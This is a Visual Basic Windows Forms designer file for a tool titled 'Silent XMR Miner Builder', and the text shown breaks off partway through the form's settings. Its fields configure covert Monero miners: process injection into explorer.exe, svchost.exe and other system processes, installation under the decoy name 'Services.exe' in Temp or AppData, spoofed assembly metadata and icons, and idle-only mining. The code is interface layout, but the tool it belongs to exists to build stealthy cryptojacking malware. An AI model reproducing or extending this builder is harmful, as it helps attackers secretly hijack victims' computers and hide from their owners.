<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
        Me.MephForm1 = New SilentXMRMiner.MephTheme()
        Me.MephTabcontrol2 = New SilentXMRMiner.MephTabcontrol()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.txtInjection = New SilentXMRMiner.MephComboBox()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.txtPoolUsername = New SilentXMRMiner.MephTextBox()
        Me.txtPoolURL = New SilentXMRMiner.MephTextBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.txtPoolPassowrd = New SilentXMRMiner.MephTextBox()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.chkInstall = New SilentXMRMiner.MephCheckBox()
        Me.txtInstallFileName = New SilentXMRMiner.MephTextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.txtInstallPathMain = New SilentXMRMiner.MephComboBox()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.chkAssembly = New SilentXMRMiner.MephCheckBox()
        Me.btn_assemblyRandom = New SilentXMRMiner.MephButton()
        Me.txtTitle = New SilentXMRMiner.MephTextBox()
        Me.btn_assemblyClone = New SilentXMRMiner.MephButton()
        Me.txtProduct = New SilentXMRMiner.MephTextBox()
        Me.num_Assembly4 = New SilentXMRMiner.MephTextBox()
        Me.txtDescription = New SilentXMRMiner.MephTextBox()
        Me.num_Assembly3 = New SilentXMRMiner.MephTextBox()
        Me.txtCopyright = New SilentXMRMiner.MephTextBox()
        Me.num_Assembly2 = New SilentXMRMiner.MephTextBox()
        Me.txtCompany = New SilentXMRMiner.MephTextBox()
        Me.num_Assembly1 = New SilentXMRMiner.MephTextBox()
        Me.txtTrademark = New SilentXMRMiner.MephTextBox()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.chkIcon = New SilentXMRMiner.MephCheckBox()
        Me.picIcon = New System.Windows.Forms.PictureBox()
        Me.btnBrowseIcon = New SilentXMRMiner.MephButton()
        Me.txtIconPath = New SilentXMRMiner.MephTextBox()
        Me.TabPage6 = New System.Windows.Forms.TabPage()
        Me.Label13 = New System.Windows.Forms.Label()
        Me.toggleEnableCPU = New SilentXMRMiner.MephToggleSwitch()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.toggleEnableNicehash = New SilentXMRMiner.MephToggleSwitch()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.toggleEnableIdle = New SilentXMRMiner.MephToggleSwitch()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.toggleEnableGPU = New SilentXMRMiner.MephToggleSwitch()
        Me.txtMaxCPU = New SilentXMRMiner.MephComboBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.labelHackforums = New System.Windows.Forms.LinkLabel()
        Me.labelGitHub = New System.Windows.Forms.LinkLabel()
        Me.txtLog = New SilentXMRMiner.MephTextBox()
        Me.btnBuild = New SilentXMRMiner.MephButton()
        Me.TooltipHelper = New System.Windows.Forms.ToolTip(Me.components)
        Me.MephForm1.SuspendLayout()
        Me.MephTabcontrol2.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        CType(Me.picIcon, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage6.SuspendLayout()
        Me.TabPage5.SuspendLayout()
        Me.SuspendLayout()
        '
        'BackgroundWorker1
        '
        '
        'BackgroundWorker2
        '
        '
        'MephForm1
        '
        Me.MephForm1.AccentColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.MephForm1.BackColor = System.Drawing.Color.FromArgb(CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer))
        Me.MephForm1.Controls.Add(Me.MephTabcontrol2)
        Me.MephForm1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.MephForm1.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.MephForm1.ForeColor = System.Drawing.Color.Gray
        Me.MephForm1.Location = New System.Drawing.Point(0, 0)
        Me.MephForm1.Margin = New System.Windows.Forms.Padding(2)
        Me.MephForm1.MaximumSize = New System.Drawing.Size(535, 272)
        Me.MephForm1.MinimumSize = New System.Drawing.Size(535, 272)
        Me.MephForm1.Name = "MephForm1"
        Me.MephForm1.Size = New System.Drawing.Size(535, 272)
        Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
        Me.MephForm1.TabIndex = 0
        Me.MephForm1.Text = "Silent XMR Miner Builder"
        '
        'MephTabcontrol2
        '
        Me.MephTabcontrol2.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.MephTabcontrol2.Controls.Add(Me.TabPage1)
        Me.MephTabcontrol2.Controls.Add(Me.TabPage2)
        Me.MephTabcontrol2.Controls.Add(Me.TabPage3)
        Me.MephTabcontrol2.Controls.Add(Me.TabPage4)
        Me.MephTabcontrol2.Controls.Add(Me.TabPage6)
        Me.MephTabcontrol2.Controls.Add(Me.TabPage5)
        Me.MephTabcontrol2.ItemSize = New System.Drawing.Size(32, 85)
        Me.MephTabcontrol2.Location = New System.Drawing.Point(12, 65)
        Me.MephTabcontrol2.Multiline = True
        Me.MephTabcontrol2.Name = "MephTabcontrol2"
        Me.MephTabcontrol2.SelectedIndex = 0
        Me.MephTabcontrol2.Size = New System.Drawing.Size(511, 197)
        Me.MephTabcontrol2.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.MephTabcontrol2.TabIndex = 17
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage1.Controls.Add(Me.Label5)
        Me.TabPage1.Controls.Add(Me.txtInjection)
        Me.TabPage1.Controls.Add(Me.Label10)
        Me.TabPage1.Controls.Add(Me.Label8)
        Me.TabPage1.Controls.Add(Me.txtPoolUsername)
        Me.TabPage1.Controls.Add(Me.txtPoolURL)
        Me.TabPage1.Controls.Add(Me.Label6)
        Me.TabPage1.Controls.Add(Me.Label7)
        Me.TabPage1.Controls.Add(Me.txtPoolPassowrd)
        Me.TabPage1.Location = New System.Drawing.Point(89, 4)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Size = New System.Drawing.Size(418, 189)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Main"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(8, 158)
        Me.Label5.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(67, 17)
        Me.Label5.TabIndex = 19
        Me.Label5.Text = "Inject Into:"
        '
        'txtInjection
        '
        Me.txtInjection.BackColor = System.Drawing.Color.Transparent
        Me.txtInjection.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.txtInjection.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtInjection.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.txtInjection.ForeColor = System.Drawing.Color.Silver
        Me.txtInjection.FormattingEnabled = True
        Me.txtInjection.ItemHeight = 16
        Me.txtInjection.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
        Me.txtInjection.Items.AddRange(New Object() {"explorer.exe (%WINDIR%)", "svchost.exe (%WINDIR%\System32)", "nslookup.exe (%WINDIR%\System32)", "cmd.exe (%WINDIR%\System32)", "notepad.exe (%WINDIR%\System32)"})
        Me.txtInjection.Location = New System.Drawing.Point(79, 156)
        Me.txtInjection.Margin = New System.Windows.Forms.Padding(2)
        Me.txtInjection.Name = "txtInjection"
        Me.txtInjection.Size = New System.Drawing.Size(327, 22)
        Me.txtInjection.StartIndex = 0
        Me.txtInjection.TabIndex = 18
        '
        'Label10
        '
        Me.Label10.AutoSize = True
        Me.Label10.Location = New System.Drawing.Point(185, 6)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(218, 17)
        Me.Label10.TabIndex = 16
        Me.Label10.Text = "(Example: xmr.examplepool.com:80)"
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Location = New System.Drawing.Point(7, 6)
        Me.Label8.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(37, 17)
        Me.Label8.TabIndex = 15
        Me.Label8.Text = "Pool:"
        '
        'txtPoolUsername
        '
        Me.txtPoolUsername.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtPoolUsername.ForeColor = System.Drawing.Color.Silver
        Me.txtPoolUsername.Location = New System.Drawing.Point(11, 77)
        Me.txtPoolUsername.Margin = New System.Windows.Forms.Padding(2)
        Me.txtPoolUsername.MaxLength = 32767
        Me.txtPoolUsername.MultiLine = False
        Me.txtPoolUsername.Name = "txtPoolUsername"
        Me.txtPoolUsername.Size = New System.Drawing.Size(395, 24)
        Me.txtPoolUsername.TabIndex = 10
        Me.txtPoolUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtPoolUsername.UseSystemPasswordChar = False
        Me.txtPoolUsername.WordWrap = False
        '
        'txtPoolURL
        '
        Me.txtPoolURL.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtPoolURL.ForeColor = System.Drawing.Color.Silver
        Me.txtPoolURL.Location = New System.Drawing.Point(12, 29)
        Me.txtPoolURL.Margin = New System.Windows.Forms.Padding(2)
        Me.txtPoolURL.MaxLength = 32767
        Me.txtPoolURL.MultiLine = False
        Me.txtPoolURL.Name = "txtPoolURL"
        Me.txtPoolURL.Size = New System.Drawing.Size(394, 24)
        Me.txtPoolURL.TabIndex = 14
        Me.txtPoolURL.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtPoolURL.UseSystemPasswordChar = False
        Me.txtPoolURL.WordWrap = False
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(7, 55)
        Me.Label6.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(130, 17)
        Me.Label6.TabIndex = 11
        Me.Label6.Text = "Wallet Address/User:"
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Location = New System.Drawing.Point(8, 99)
        Me.Label7.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(137, 17)
        Me.Label7.TabIndex = 13
        Me.Label7.Text = "Password (if required)"
        '
        'txtPoolPassowrd
        '
        Me.txtPoolPassowrd.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtPoolPassowrd.ForeColor = System.Drawing.Color.Silver
        Me.txtPoolPassowrd.Location = New System.Drawing.Point(12, 122)
        Me.txtPoolPassowrd.Margin = New System.Windows.Forms.Padding(2)
        Me.txtPoolPassowrd.MaxLength = 32767
        Me.txtPoolPassowrd.MultiLine = False
        Me.txtPoolPassowrd.Name = "txtPoolPassowrd"
        Me.txtPoolPassowrd.Size = New System.Drawing.Size(394, 24)
        Me.txtPoolPassowrd.TabIndex = 12
        Me.txtPoolPassowrd.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtPoolPassowrd.UseSystemPasswordChar = False
        Me.txtPoolPassowrd.WordWrap = False
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.chkInstall)
        Me.TabPage2.Controls.Add(Me.txtInstallFileName)
        Me.TabPage2.Controls.Add(Me.Label2)
        Me.TabPage2.Controls.Add(Me.Label1)
        Me.TabPage2.Controls.Add(Me.txtInstallPathMain)
        Me.TabPage2.Location = New System.Drawing.Point(89, 4)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Size = New System.Drawing.Size(418, 189)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Install"
        '
        'chkInstall
        '
        Me.chkInstall.AccentColor = System.Drawing.Color.Maroon
        Me.chkInstall.BackColor = System.Drawing.Color.Transparent
        Me.chkInstall.Checked = False
        Me.chkInstall.Cursor = System.Windows.Forms.Cursors.Hand
        Me.chkInstall.ForeColor = System.Drawing.Color.Black
        Me.chkInstall.Location = New System.Drawing.Point(14, 12)
        Me.chkInstall.Margin = New System.Windows.Forms.Padding(2)
        Me.chkInstall.Name = "chkInstall"
        Me.chkInstall.Size = New System.Drawing.Size(111, 24)
        Me.chkInstall.TabIndex = 21
        Me.chkInstall.Text = "Disabled"
        '
        'txtInstallFileName
        '
        Me.txtInstallFileName.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtInstallFileName.Enabled = False
        Me.txtInstallFileName.ForeColor = System.Drawing.Color.Silver
        Me.txtInstallFileName.Location = New System.Drawing.Point(83, 81)
        Me.txtInstallFileName.Margin = New System.Windows.Forms.Padding(2)
        Me.txtInstallFileName.MaxLength = 32767
        Me.txtInstallFileName.MultiLine = False
        Me.txtInstallFileName.Name = "txtInstallFileName"
        Me.txtInstallFileName.Size = New System.Drawing.Size(127, 24)
        Me.txtInstallFileName.TabIndex = 8
        Me.txtInstallFileName.Text = "Services.exe"
        Me.txtInstallFileName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtInstallFileName.UseSystemPasswordChar = False
        Me.txtInstallFileName.WordWrap = False
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(8, 45)
        Me.Label2.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(67, 17)
        Me.Label2.TabIndex = 19
        Me.Label2.Text = "Save Path:"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(8, 79)
        Me.Label1.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(62, 17)
        Me.Label1.TabIndex = 9
        Me.Label1.Text = "Filename:"
        '
        'txtInstallPathMain
        '
        Me.txtInstallPathMain.BackColor = System.Drawing.Color.Transparent
        Me.txtInstallPathMain.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.txtInstallPathMain.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtInstallPathMain.Enabled = False
        Me.txtInstallPathMain.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.txtInstallPathMain.ForeColor = System.Drawing.Color.Silver
        Me.txtInstallPathMain.FormattingEnabled = True
        Me.txtInstallPathMain.ItemHeight = 16
        Me.txtInstallPathMain.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
        Me.txtInstallPathMain.Items.AddRange(New Object() {"Temp", "AppData", "UserProfile"})
        Me.txtInstallPathMain.Location = New System.Drawing.Point(83, 47)
        Me.txtInstallPathMain.Margin = New System.Windows.Forms.Padding(2)
        Me.txtInstallPathMain.Name = "txtInstallPathMain"
        Me.txtInstallPathMain.Size = New System.Drawing.Size(127, 22)
        Me.txtInstallPathMain.StartIndex = 0
        Me.txtInstallPathMain.TabIndex = 18
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage3.Controls.Add(Me.Label9)
        Me.TabPage3.Controls.Add(Me.chkAssembly)
        Me.TabPage3.Controls.Add(Me.btn_assemblyRandom)
        Me.TabPage3.Controls.Add(Me.txtTitle)
        Me.TabPage3.Controls.Add(Me.btn_assemblyClone)
        Me.TabPage3.Controls.Add(Me.txtProduct)
        Me.TabPage3.Controls.Add(Me.num_Assembly4)
        Me.TabPage3.Controls.Add(Me.txtDescription)
        Me.TabPage3.Controls.Add(Me.num_Assembly3)
        Me.TabPage3.Controls.Add(Me.txtCopyright)
        Me.TabPage3.Controls.Add(Me.num_Assembly2)
        Me.TabPage3.Controls.Add(Me.txtCompany)
        Me.TabPage3.Controls.Add(Me.num_Assembly1)
        Me.TabPage3.Controls.Add(Me.txtTrademark)
        Me.TabPage3.Location = New System.Drawing.Point(89, 4)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(418, 189)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Assembly"
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.Location = New System.Drawing.Point(11, 160)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(54, 17)
        Me.Label9.TabIndex = 22
        Me.Label9.Text = "Version:"
        '
        'chkAssembly
        '
        Me.chkAssembly.AccentColor = System.Drawing.Color.Maroon
        Me.chkAssembly.BackColor = System.Drawing.Color.Transparent
        Me.chkAssembly.Checked = False
        Me.chkAssembly.Cursor = System.Windows.Forms.Cursors.Hand
        Me.chkAssembly.ForeColor = System.Drawing.Color.Black
        Me.chkAssembly.Location = New System.Drawing.Point(14, 12)
        Me.chkAssembly.Margin = New System.Windows.Forms.Padding(2)
        Me.chkAssembly.Name = "chkAssembly"
        Me.chkAssembly.Size = New System.Drawing.Size(111, 24)
        Me.chkAssembly.TabIndex = 21
        Me.chkAssembly.Text = "Disabled"
        '
        'btn_assemblyRandom
        '
        Me.btn_assemblyRandom.BackColor = System.Drawing.Color.Transparent
        Me.btn_assemblyRandom.Enabled = False
        Me.btn_assemblyRandom.ForeColor = System.Drawing.Color.FromArgb(CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer))
        Me.btn_assemblyRandom.Location = New System.Drawing.Point(324, 156)
        Me.btn_assemblyRandom.Margin = New System.Windows.Forms.Padding(2)
        Me.btn_assemblyRandom.Name = "btn_assemblyRandom"
        Me.btn_assemblyRandom.Size = New System.Drawing.Size(81, 25)
        Me.btn_assemblyRandom.TabIndex = 5
        Me.btn_assemblyRandom.Text = "Randomize"
        '
        'txtTitle
        '
        Me.txtTitle.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtTitle.Enabled = False
        Me.txtTitle.ForeColor = System.Drawing.Color.Silver
        Me.txtTitle.Location = New System.Drawing.Point(14, 47)
        Me.txtTitle.Margin = New System.Windows.Forms.Padding(2)
        Me.txtTitle.MaxLength = 32767
        Me.txtTitle.MultiLine = False
        Me.txtTitle.Name = "txtTitle"
        Me.txtTitle.Size = New System.Drawing.Size(176, 24)
        Me.txtTitle.TabIndex = 0
        Me.txtTitle.Text = "Title..."
        Me.txtTitle.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtTitle.UseSystemPasswordChar = False
        Me.txtTitle.WordWrap = False
        '
        'btn_assemblyClone
        '
        Me.btn_assemblyClone.BackColor = System.Drawing.Color.Transparent
        Me.btn_assemblyClone.Enabled = False
        Me.btn_assemblyClone.ForeColor = System.Drawing.Color.FromArgb(CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer))
        Me.btn_assemblyClone.Location = New System.Drawing.Point(230, 156)
        Me.btn_assemblyClone.Margin = New System.Windows.Forms.Padding(2)
        Me.btn_assemblyClone.Name = "btn_assemblyClone"
        Me.btn_assemblyClone.Size = New System.Drawing.Size(80, 25)
        Me.btn_assemblyClone.TabIndex = 6
        Me.btn_assemblyClone.Text = "Clone File"
        '
        'txtProduct
        '
        Me.txtProduct.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtProduct.Enabled = False
        Me.txtProduct.ForeColor = System.Drawing.Color.Silver
        Me.txtProduct.Location = New System.Drawing.Point(230, 47)
        Me.txtProduct.Margin = New System.Windows.Forms.Padding(2)
        Me.txtProduct.MaxLength = 32767
        Me.txtProduct.MultiLine = False
        Me.txtProduct.Name = "txtProduct"
        Me.txtProduct.Size = New System.Drawing.Size(176, 24)
        Me.txtProduct.TabIndex = 0
        Me.txtProduct.Text = "Product..."
        Me.txtProduct.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtProduct.UseSystemPasswordChar = False
        Me.txtProduct.WordWrap = False
        '
        'num_Assembly4
        '
        Me.num_Assembly4.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.num_Assembly4.Enabled = False
        Me.num_Assembly4.ForeColor = System.Drawing.Color.Silver
        Me.num_Assembly4.Location = New System.Drawing.Point(167, 157)
        Me.num_Assembly4.Margin = New System.Windows.Forms.Padding(2)
        Me.num_Assembly4.MaxLength = 32767
        Me.num_Assembly4.MultiLine = False
        Me.num_Assembly4.Name = "num_Assembly4"
        Me.num_Assembly4.Size = New System.Drawing.Size(23, 24)
        Me.num_Assembly4.TabIndex = 1
        Me.num_Assembly4.Text = "0"
        Me.num_Assembly4.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly4.UseSystemPasswordChar = False
        Me.num_Assembly4.WordWrap = False
        '
        'txtDescription
        '
        Me.txtDescription.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtDescription.Enabled = False
        Me.txtDescription.ForeColor = System.Drawing.Color.Silver
        Me.txtDescription.Location = New System.Drawing.Point(14, 83)
        Me.txtDescription.Margin = New System.Windows.Forms.Padding(2)
        Me.txtDescription.MaxLength = 32767
        Me.txtDescription.MultiLine = False
        Me.txtDescription.Name = "txtDescription"
        Me.txtDescription.Size = New System.Drawing.Size(176, 24)
        Me.txtDescription.TabIndex = 0
        Me.txtDescription.Text = "Description..."
        Me.txtDescription.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtDescription.UseSystemPasswordChar = False
        Me.txtDescription.WordWrap = False
        '
        'num_Assembly3
        '
        Me.num_Assembly3.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.num_Assembly3.Enabled = False
        Me.num_Assembly3.ForeColor = System.Drawing.Color.Silver
        Me.num_Assembly3.Location = New System.Drawing.Point(140, 157)
        Me.num_Assembly3.Margin = New System.Windows.Forms.Padding(2)
        Me.num_Assembly3.MaxLength = 32767
        Me.num_Assembly3.MultiLine = False
        Me.num_Assembly3.Name = "num_Assembly3"
        Me.num_Assembly3.Size = New System.Drawing.Size(23, 24)
        Me.num_Assembly3.TabIndex = 2
        Me.num_Assembly3.Text = "0"
        Me.num_Assembly3.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly3.UseSystemPasswordChar = False
        Me.num_Assembly3.WordWrap = False
        '
        'txtCopyright
        '
        Me.txtCopyright.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtCopyright.Enabled = False
        Me.txtCopyright.ForeColor = System.Drawing.Color.Silver
        Me.txtCopyright.Location = New System.Drawing.Point(230, 83)
        Me.txtCopyright.Margin = New System.Windows.Forms.Padding(2)
        Me.txtCopyright.MaxLength = 32767
        Me.txtCopyright.MultiLine = False
        Me.txtCopyright.Name = "txtCopyright"
        Me.txtCopyright.Size = New System.Drawing.Size(176, 24)
        Me.txtCopyright.TabIndex = 0
        Me.txtCopyright.Text = "Copyright..."
        Me.txtCopyright.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtCopyright.UseSystemPasswordChar = False
        Me.txtCopyright.WordWrap = False
        '
        'num_Assembly2
        '
        Me.num_Assembly2.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.num_Assembly2.Enabled = False
        Me.num_Assembly2.ForeColor = System.Drawing.Color.Silver
        Me.num_Assembly2.Location = New System.Drawing.Point(113, 157)
        Me.num_Assembly2.Margin = New System.Windows.Forms.Padding(2)
        Me.num_Assembly2.MaxLength = 32767
        Me.num_Assembly2.MultiLine = False
        Me.num_Assembly2.Name = "num_Assembly2"
        Me.num_Assembly2.Size = New System.Drawing.Size(23, 24)
        Me.num_Assembly2.TabIndex = 3
        Me.num_Assembly2.Text = "0"
        Me.num_Assembly2.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly2.UseSystemPasswordChar = False
        Me.num_Assembly2.WordWrap = False
        '
        'txtCompany
        '
        Me.txtCompany.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtCompany.Enabled = False
        Me.txtCompany.ForeColor = System.Drawing.Color.Silver
        Me.txtCompany.Location = New System.Drawing.Point(14, 119)
        Me.txtCompany.Margin = New System.Windows.Forms.Padding(2)
        Me.txtCompany.MaxLength = 32767
        Me.txtCompany.MultiLine = False
        Me.txtCompany.Name = "txtCompany"
        Me.txtCompany.Size = New System.Drawing.Size(176, 24)
        Me.txtCompany.TabIndex = 0
        Me.txtCompany.Text = "Company..."
        Me.txtCompany.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtCompany.UseSystemPasswordChar = False
        Me.txtCompany.WordWrap = False
        '
        'num_Assembly1
        '
        Me.num_Assembly1.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.num_Assembly1.Enabled = False
        Me.num_Assembly1.ForeColor = System.Drawing.Color.Silver
        Me.num_Assembly1.Location = New System.Drawing.Point(87, 157)
        Me.num_Assembly1.Margin = New System.Windows.Forms.Padding(2)
        Me.num_Assembly1.MaxLength = 32767
        Me.num_Assembly1.MultiLine = False
        Me.num_Assembly1.Name = "num_Assembly1"
        Me.num_Assembly1.Size = New System.Drawing.Size(23, 24)
        Me.num_Assembly1.TabIndex = 4
        Me.num_Assembly1.Text = "0"
        Me.num_Assembly1.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly1.UseSystemPasswordChar = False
        Me.num_Assembly1.WordWrap = False
        '
        'txtTrademark
        '
        Me.txtTrademark.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtTrademark.Enabled = False
        Me.txtTrademark.ForeColor = System.Drawing.Color.Silver
        Me.txtTrademark.Location = New System.Drawing.Point(230, 119)
        Me.txtTrademark.Margin = New System.Windows.Forms.Padding(2)
        Me.txtTrademark.MaxLength = 32767
        Me.txtTrademark.MultiLine = False
        Me.txtTrademark.Name = "txtTrademark"
        Me.txtTrademark.Size = New System.Drawing.Size(176, 24)
        Me.txtTrademark.TabIndex = 0
        Me.txtTrademark.Text = "Trademark..."
        Me.txtTrademark.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtTrademark.UseSystemPasswordChar = False
        Me.txtTrademark.WordWrap = False
        '
        'TabPage4
        '
        Me.TabPage4.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage4.Controls.Add(Me.chkIcon)
        Me.TabPage4.Controls.Add(Me.picIcon)
        Me.TabPage4.Controls.Add(Me.btnBrowseIcon)
        Me.TabPage4.Controls.Add(Me.txtIconPath)
        Me.TabPage4.Location = New System.Drawing.Point(89, 4)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Size = New System.Drawing.Size(418, 189)
        Me.TabPage4.TabIndex = 3
